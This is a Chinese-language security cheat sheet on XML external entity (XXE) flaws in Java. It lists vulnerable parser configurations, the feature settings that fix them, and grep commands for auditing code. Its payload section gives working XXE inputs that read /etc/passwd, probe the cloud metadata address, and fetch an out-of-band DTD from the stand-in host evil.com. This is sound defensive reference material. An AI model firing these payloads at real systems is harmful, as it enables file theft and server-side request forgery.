# Java XXE

## 确认条件

XML解析器处理用户可控XML且未禁用DTD/外部实体。

## 检测

```java
// DocumentBuilder 默认配置
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// Java 8u181 前部分配置默认允许 DTD
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xml)));

// SAXParser
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);

// XMLReader
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setContentHandler(handler);
reader.parse(new InputSource(new StringReader(xml)));

// Transformer
TransformerFactory tf = TransformerFactory.newInstance();
Transformer transformer = tf.newTransformer();
Source source = new StreamSource(new StringReader(xml));

// JAXB
JAXBContext context = JAXBContext.newInstance(User.class);
Unmarshaller unmarshaller = context.createUnmarshaller();
User user = (User) unmarshaller.unmarshal(new StringReader(xml));
```

## 修复

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

## 利用Payload

```xml
<!-- 文件读取 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<root>&xxe;</root>

<!-- 盲XXE OOB -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
```

## 检测命令

```bash
grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLReader\|TransformerFactory" --include="*.java"
grep -rn "JAXBContext\|Unmarshaller" --include="*.java"
grep -rn "disallow-doctype-decl\|external-general-entities" --include="*.java"
```
